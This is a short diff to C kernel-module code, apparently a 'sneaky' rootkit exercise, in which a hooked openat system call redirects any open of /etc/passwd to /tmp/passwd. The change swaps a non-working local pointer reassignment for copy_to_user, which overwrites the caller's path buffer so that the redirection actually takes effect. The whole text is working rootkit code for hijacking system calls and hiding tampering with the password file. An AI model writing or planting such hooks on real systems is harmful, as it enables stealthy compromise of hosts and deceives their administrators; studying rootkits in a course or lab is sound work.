@@ -100,11 +100,8 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   const char *pathname = (const char *)regs->si;
   // Implement the sneaky part here
   if (strcmp(pathname, "/etc/passwd") == 0) {
-      char new_path[150];
-      strncpy(new_path, "/tmp/passwd", sizeof(new_path));
-      // Make sure the new path is null-terminated
-      new_path[sizeof(new_path) - 1] = '\0';
-      pathname = new_path;
+        char newPath[] = "/tmp/passwd";
+        copy_to_user((void *)regs->si, newPath, strlen(newPath));
     }
   return (*original_openat)(regs);
 }
